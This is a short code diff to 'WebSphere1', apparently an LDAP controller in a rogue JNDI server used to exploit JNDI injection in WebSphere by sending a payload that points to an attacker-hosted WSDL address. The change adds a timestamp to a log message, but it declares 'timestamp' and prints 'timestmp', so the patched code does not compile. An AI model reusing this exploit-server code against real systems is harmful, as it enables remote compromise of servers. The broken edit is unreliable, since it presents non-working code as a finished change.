@@ -10,6 +10,7 @@ import com.unboundid.ldap.sdk.ResultCode;
 
 import javax.naming.Reference;
 import javax.naming.StringRefAddr;
+import java.sql.Timestamp;
 
 import static artsploit.Utilities.serialize;
 
@@ -36,8 +37,9 @@ public class WebSphere1 implements LdapController {
         String wsdl = Utilities.getDnParam(result.getRequest().getBaseDN(), "wsdl");
         if(wsdl == null)
             wsdl = "http://" + Config.hostname + ":" + Config.httpPort + Config.wsdl; //get from config if not specified
-
-        System.out.println("Sending Websphere1 payload pointing to " + wsdl);
+        
+        Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+        System.out.println(timestmp + "Sending Websphere1 payload pointing to " + wsdl);
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
